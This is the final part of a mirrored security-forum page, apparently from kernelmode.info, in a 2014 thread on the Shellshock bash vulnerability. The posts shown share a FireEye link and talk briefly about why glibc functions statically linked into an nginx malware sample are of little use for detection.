+				    <div class="user-profile-output">
+						501
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Thu Apr 12, 2012 4:53 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p24006" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p24006">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopicae09-2.html?p=24006#p24006" title="Post">#24006</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9125.html?mode=viewprofile&amp;u=143" style="color: #4040FF;" class="username-coloured">rkhunter</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Mon Sep 29, 2014 11:24 am 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content24006">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content"><a href="http://www.fireeye.com/blog/uncategorized/2014/09/shellshock-in-the-wild.html" class="postlink">http://www.fireeye.com/blog/uncategoriz ... -wild.html</a></div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile24006">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9125.html?mode=viewprofile&amp;u=143"><img class="img-rounded avatar" src="kmdata/file8307.jpg" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9125.html?mode=viewprofile&amp;u=143" style="color: #4040FF;" class="username-coloured">rkhunter</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						1156
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Mon Mar 15, 2010 12:51 pm
+					</div>
+				</div>
+								
+				
+								
+																								<div class="user-profile-row">
+					    <div class="user-profile-tag">Location</div>
+				    <div class="user-profile-output">
+						Russian Federation
+					</div>
+				</div>
+																
+							    				<div class="user-profile-row">
+					<div class="user-profile-tag">Contact</div>
+					<div class="user-profile-output-contact">
+							<ul class="mini-profile-contact list-inline text-center">
+															 																																<li><a class="btn btn-xs btn-default" href="http://artemonsecurity.blogspot.com/" title="Website">
+								 <i class="fa fa-phpbb_website"></i>
+								 </a>
+								</li>
+																														</ul>
+					</div>
+				</div>
+												
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p24074" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p24074">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopic124f.html?p=24074#p24074" title="Post">#24074</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist1a3a.html?mode=viewprofile&amp;u=3691" style="color: #595959;" class="username-coloured">aaSSfxxx</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Tue Oct 07, 2014 11:43 am 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content24074">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content">Hello,<br>
+<br>
+The project file list you give is just glibc's stuff as the nginx 
+malware is statically-linked with it, so it's useless for detection 
+unfortunately</div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile24074">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist1a3a.html?mode=viewprofile&amp;u=3691"><img class="img-rounded avatar" src="kmdata/filedf35.jpg" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist1a3a.html?mode=viewprofile&amp;u=3691" style="color: #595959;" class="username-coloured">aaSSfxxx</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						12
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Tue Oct 23, 2012 8:28 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p24084" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p24084">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopic9755.html?p=24084#p24084" title="Post">#24084</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Wed Oct 08, 2014 3:29 am 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content24084">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content"><blockquote><cite>aaSSfxxx wrote:</cite>Hello,<br>
+The project file list you give is just glibc's stuff as the nginx 
+malware is statically-linked with it, so it's useless for detection 
+unfortunately</blockquote>
+Hello aaSSfxxx ;) How are you! Would you pls kindly explain to which 
+person and which post (link will be helpful) you addressed the question?</div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile24084">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						501
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Thu Apr 12, 2012 4:53 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p24089" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p24089">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopicc647-2.html?p=24089#p24089" title="Post">#24089</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist1a3a.html?mode=viewprofile&amp;u=3691" style="color: #595959;" class="username-coloured">aaSSfxxx</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Wed Oct 08, 2014 3:14 pm 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content24089">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content">Hello, I'm fine :)<br>
+<br>
+Sorry, I forgot to link of the post I was talking to, so here it is: <a href="https://www.kernelmode.info/forum/viewtopic6b75.html?f=16&amp;t=3505#p23989" class="postlink">http://www.kernelmode.info/forum/viewto ... 505#p23989</a><br>
+<br>
+I tried to make sigfiles to detect glibc's functions linked with that malware but I didn't find the proper glibc version used :(</div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile24089">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist1a3a.html?mode=viewprofile&amp;u=3691"><img class="img-rounded avatar" src="kmdata/filedf35.jpg" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist1a3a.html?mode=viewprofile&amp;u=3691" style="color: #595959;" class="username-coloured">aaSSfxxx</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						12
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Tue Oct 23, 2012 8:28 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+
+
+
+
+ <div class="pull-right">
+     <ul class="pagination pagination-sm hidden-xs">
+	 	<li><a title="" href="javascript:void(0);" data-target=".sorting" data-toggle="collapse">Options</a></li>				
+     	  <li class="active"><a>43 posts</a></li>
+			
+		<li class="active"><a>1</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic1bb4.html?f=16&amp;t=3505&amp;start=10" role="button">2</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic4ff2-2.html?f=16&amp;t=3505&amp;start=20" role="button">3</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic019d.html?f=16&amp;t=3505&amp;start=30" role="button">4</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic4910.html?f=16&amp;t=3505&amp;start=40" role="button">5</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic1bb4.html?f=16&amp;t=3505&amp;start=10" rel="next" role="button">Next</a></li>
+	
+		     </ul>
+	 
+	<div class="visible-xs"> 
+	<ul class="pagination pagination-sm">
+	 	 <li><a title="" href="javascript:void(0);" data-target=".sorting" data-toggle="collapse"><i class="fa fa-cog"></i></a></li>				
+	 <li><a class="pagination-trigger" data-placement="top">Page <strong>1</strong> of <strong>5</strong></a></li>
+	 <li class="active"><a>43 posts</a></li>
+	</ul>
+	</div>
+ </div>
+</div>
+
+<div class="clearfix">
+   <div class="pull-right">
+	<div class="visible-xs"> 
+	 <ul class="pagination pagination-sm">
+	 			
+		<li class="active"><a>1</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic1bb4.html?f=16&amp;t=3505&amp;start=10" role="button">2</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic4ff2-2.html?f=16&amp;t=3505&amp;start=20" role="button">3</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic019d.html?f=16&amp;t=3505&amp;start=30" role="button">4</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic4910.html?f=16&amp;t=3505&amp;start=40" role="button">5</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic1bb4.html?f=16&amp;t=3505&amp;start=10" rel="next" role="button"><i class="fa fa-chevron-right"></i></a></li>
+	
+			 </ul>
+	</div>
+   </div>
+</div>
+
+<div class="space10"></div>
+<div class="pull-left">
+	<a href="https://www.kernelmode.info/forum/viewforumf2fa.html?f=16" accesskey="r"><i class="fa fa-chevron-left"></i>&nbsp;Return to “Malware”</a>
+</div>
+<div class="space10"></div>
+<div class="space10"></div>
+
+    		<form method="post" action="https://www.kernelmode.info/forum/viewtopic.php?f=16&amp;t=3505">
+		   <div class="hidden-xs">
+	<fieldset class="controls-row">
+        <div class="sorting collapse">
+			<div class="panel panel-default">
+				<div class="panel-body">
+					 <div class="row">
+					
+						<div class="col-md-3 col-sm-3"> 
+                         <label for="st">Display:</label>
+                            <div class="control-row">
+                              <select class="selectpicker" data-width="100%" data-style="btn btn-default form-control" data-container="body" name="st" id="st"><option value="0" selected="selected">All posts</option><option value="1">1 day</option><option value="7">7 days</option><option value="14">2 weeks</option><option value="30">1 month</option><option value="90">3 months</option><option value="180">6 months</option><option value="365">1 year</option></select>
+                            </div>
+						</div>
+	                    <div class="col-md-3 col-sm-3"> 
+                          <label for="sk">Sort by:</label>
+                            <div class="control-row">
+                              <select class="selectpicker" data-width="100%" data-style="btn btn-default form-control" data-container="body" name="sk" id="sk"><option value="a">Author</option><option value="t" selected="selected">Post time</option><option value="s">Subject</option></select>
+                            </div>
+						</div>				
+						<div class="col-md-3 col-sm-3">  
+                           <label for="sd">Sort by:</label>
+                            <div class="control-row">
+							<div class="input-group">
+                             <select class="selectpicker" data-width="100%" data-style="btn btn-default form-control" data-container="body" name="sd" id="sd"><option value="a" selected="selected">Ascending</option><option value="d">Descending</option></select>
+							 <span class="input-group-btn">
+                              <button class="btn btn-default" name="sort" type="submit">Go</button>
+							</span>
+							</div>
+						    </div>   
+						</div>
+					
+					<div class="col-md-3 col-sm-3"> 
+                      <label accesskey="j">Jump to:</label>
+                       <div class="control-row">
+                         <div id="jumpbox" class="dropdown">
+  <button class="btn btn-default btn-block dropdown-toggle" type="button" data-toggle="dropdown" aria-expanded="true">
+   Select the forum to jump to
+    <span class="caret"></span>
+  </button>
+  <ul class="dropdown-menu jumpbox-dropdown" role="menu" style="width: 100%;">
+  <!-- <li role="presentation" class="dropdown-header">Dropdown header</li> -->
+    	 		 	 <li role="presentation" class="jumpbox-cat-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum814c.html?f=29">Main</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum957d.html?f=8">&nbsp;&nbsp;&nbsp;&nbsp;Announcements</a></li>
+	 		 	 <li role="presentation" class="jumpbox-cat-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum9df8.html?f=31">General</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforumf2fa.html?f=16">&nbsp;&nbsp;&nbsp;&nbsp;Malware</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforumffeb.html?f=20">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Malware Requests</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum740d.html?f=21">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Completed Malware Requests</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum8a83.html?f=11">&nbsp;&nbsp;&nbsp;&nbsp;Tools/Software</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforumeb13.html?f=13">&nbsp;&nbsp;&nbsp;&nbsp;Reverse Engineering and Debugging</a></li>
+	 		 	 <li role="presentation" class="jumpbox-cat-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum48ab.html?f=17">Development</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum9780.html?f=14">&nbsp;&nbsp;&nbsp;&nbsp;Kernel-Mode Development</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforumb09f.html?f=15">&nbsp;&nbsp;&nbsp;&nbsp;User-Mode Development</a></li>
+	 		 	 <li role="presentation" class="jumpbox-cat-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum5579.html?f=30">Other</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum12a3.html?f=2">&nbsp;&nbsp;&nbsp;&nbsp;General Discussion</a></li>
+	 		 	 <li role="presentation" class="jumpbox-sub-link"><a role="menuitem" tabindex="-1" href="https://www.kernelmode.info/forum/viewforum15ca.html?f=10">&nbsp;&nbsp;&nbsp;&nbsp;Newbie Questions</a></li>
+	 	  </ul>
+</div>	
+                       </div>
+					</div>
+                   </div>
+                </div>
+			</div>
+		</div> 
+	</fieldset> 
+</div></form>		
+	
+
+
+
+
+<footer> <!-- Footer block -->
+    	
+</footer>
+	
+	</div><!-- page-body id in header -->
+  </div> <!-- padding_0_40 in header -->
+  <!-- content-forum in header -->
+ <!-- wrap - corners container in header -->
+
+<a id="totop" class="topstyle" href="#" onclick="return false;" style="display:none;"><i class="fa fa-chevron-up"></i></a>
+
+<div class="container">
+  <div class="copyright">
+	<small class="pull-left">
+						<!-- <a href="http://www.sitesplat.com/phpBB3/">BBOOTS</a> -->
+	</small>
+	<small class="pull-right">
+			<!-- &nbsp;&#45;&nbsp;All times are <span title="UTC">UTC</span>&nbsp;&#45;&nbsp; -->
+		
+	</small>
+  </div>
+</div>
+
+<div class="hidden"></div> 
+
+<!-- injected via core and ajax JS for the return confirmation actions -->
+   <div id="page-footer">
+	<div id="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">
+		<div id="darken">&nbsp;</div>
+	</div>
+
+	<div id="phpbb_alert" class="alert alert-default phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">
+		<button type="button" class="close alert_close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button>
+		<h3 class="alert_title">&nbsp;</h3>
+		 <p class="alert_text"></p>
+	</div>
+	
+	<div id="phpbb_confirm" class="alert alert-default phpbb_alert">
+		<button type="button" class="close alert_close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button>
+		<div class="alert_text"></div>
+	</div>
+  </div>	
+<!-- injected via core and ajax JS for the return confirmation actions -->
+
+
+<script>
+// this loads jquery asyncrounously & in parallel
+head.load("../../cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js", "../../cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js", "styles/BBOOTS/theme/vendors/forum_fn.min.js");
+</script>
+
+<!-- we use this event to load the JS scripts properly via the extension system -->
+
+<!-- injected via a module or an include -->
+<script>
+// some function that depends on bootstrap and jquery
+head.ready(function () {
+	$('.footable').footable();$(".selectpicker").selectpicker();$(".selectpicker").tooltip("disable");var totop=$("#totop");totop.click(function(){$("html, body").stop(true,true).animate({scrollTop:0},500);return false});$(window).scroll(function(){if($(this).scrollTop()>600){totop.fadeIn()}else{totop.fadeOut()}});$("button[data-loading-text], input[data-loading-text], .btn-load").click(function(){var e=$(this);e.button("loading");setTimeout(function(){e.button("reset")},3e3)});
+	$("input").iCheck({checkboxClass:"icheckbox_minimal-grey",radioClass:"iradio_minimal-grey"});$(".btn-search").click(function(){$(".search-input").toggleClass("open").find("input").focus()});$(".close").click(function(){$(this).prev("input").val("").parents(".search-input").removeClass("open")});$(".nav-tog").click(function(){if($(this).hasClass("neutro")){$(this).removeClass("neutro").addClass("open")}else{$(this).removeClass("open").addClass("neutro")}});
+	$('input[data-reset-on-edit]').on('keyup', function() {$(this.getAttribute('data-reset-on-edit')).val('');});
+	$('a').tooltip({trigger : 'hover',container: 'body'})
+    $('#notification_list_button').click(function(){setTimeout(function(){$(".nano").nanoScroller();},0);});	
+});
+// some function that depends on bootstrap and jquery
+</script>
+<!-- injected via a module or an include -->
+
+
+
+<!-- // lets load the plupload crap super huge files becuase... wait for it wait for it. "swear here" -->
+<script>
+// lets load the plupload crap super huge files becuase... wait for it wait for it. "swear here"
+head.ready(function () {
+//<![CDATA[
+phpbb.plupload = {
+	i18n: {
+		'b': 'B',
+		'kb': 'KB',
+		'mb': 'MB',
+		'gb': 'GB',
+		'tb': 'TB',
+		'Add Files': 'Add\u0020files',
+		'Add files to the upload queue and click the start button.': 'Add\u0020files\u0020to\u0020the\u0020upload\u0020queue\u0020and\u0020click\u0020the\u0020start\u0020button.',
+		'Close': 'Close',
+		'Drag files here.': 'Drag\u0020files\u0020here.',
+		'Duplicate file error.': 'Duplicate\u0020file\u0020error.',
+		'File: %s': 'File\u003A\u0020\u0025s',
+		'File: %s, size: %d, max file size: %d': 'File\u003A\u0020\u0025s,\u0020size\u003A\u0020\u0025d,\u0020max\u0020file\u0020size\u003A\u0020\u0025d',
+		'File count error.': 'File\u0020count\u0020error.',
+		'File extension error.': 'File\u0020extension\u0020error.',
+		'File size error.': 'File\u0020size\u0020error.',
+		'File too large:': 'File\u0020too\u0020large\u003A',
+		'Filename': 'Filename',
+		'Generic error.': 'Generic\u0020error.',
+		'HTTP Error.': 'HTTP\u0020error.',
+		'Image format either wrong or not supported.': 'Image\u0020format\u0020either\u0020wrong\u0020or\u0020not\u0020supported.',
+		'Init error.': 'Init\u0020error.',
+		'IO error.': 'IO\u0020error.',
+		'Invalid file extension:': 'Invalid\u0020file\u0020extension\u003A',
+		'N/A': 'N\/A',
+		'Runtime ran out of available memory.': 'Runtime\u0020ran\u0020out\u0020of\u0020available\u0020memory.',
+		'Security error.': 'Security\u0020error.',
+		'Select files': 'Select\u0020files',
+		'Size': 'Size',
+		'Start Upload': 'Start\u0020upload',
+		'Start uploading queue': 'Start\u0020uploading\u0020queue',
+		'Status': 'Status',
+		'Stop Upload': 'Stop\u0020upload',
+		'Stop current upload': 'Stop\u0020current\u0020upload',
+		"Upload URL might be wrong or doesn't exist.": 'Upload\u0020URL\u0020might\u0020be\u0020wrong\u0020or\u0020does\u0020not\u0020exist.',
+		'Uploaded %d/%d files': 'Uploaded\u0020\u0025d\/\u0025d\u0020files',
+		'%d files queued': '\u0025d\u0020files\u0020queued',
+		'%s already present in the queue.': '\u0025s\u0020already\u0020present\u0020in\u0020the\u0020queue.'
+	},
+	config: {
+		runtimes: 'html5',
+		url: './posting.php?mode=reply&f=16&t=3505',
+		max_file_size: '10244588b',
+		chunk_size: '1048576b',
+		unique_names: true,
+		filters: [{title: 'Images', extensions: 'gif,png,jpeg,jpg,tif,tiff,tga'},{title: 'Archives', extensions: 'gtar,gz,tar,zip,rar,ace,torrent,tgz,bz2,7z'},{title: 'Plain_text', extensions: 'txt,c,h,cpp,hpp,diz,csv,ini,log,js,xml'},{title: 'Documents', extensions: 'xls,xlsx,xlsm,xlsb,doc,docx,docm,dot,dotx,dotm,pdf,ai,ps,ppt,pptx,pptm,odg,odp,ods,odt,rtf'}],
+		
+		headers: {'X-PHPBB-USING-PLUPLOAD': '1', 'X-Requested-With': 'XMLHttpRequest'},
+		file_data_name: 'fileupload',
+		multipart_params: {'add_file': 'ADD_FILE'},
+		form_hook: '#qr_postform',
+		browse_button: 'add_files',
+		drop_element : 'message',
+	},
+	lang: {
+		ERROR: 'Error',
+		TOO_MANY_ATTACHMENTS: 'TOO_MANY_ATTACHMENTS',
+	},
+	order: 'desc',
+	maxFiles: 10,
+	data: [],
+}
+//]]>
+head.load("assets/plupload/plupload.full.min.js", "styles/BBOOTS/theme/vendors/plupload.min.js");
+});
+</script>
+
+<!-- Google Analytics: change UA-XXXXXXXX-X to be your site's ID. -->
+
+
+
+
+</body><!-- Mirrored from www.kernelmode.info/forum/viewtopic.php?f=16&t=3505 , Sun, 01 Dec 2019 16:53:20 GMT --></html>
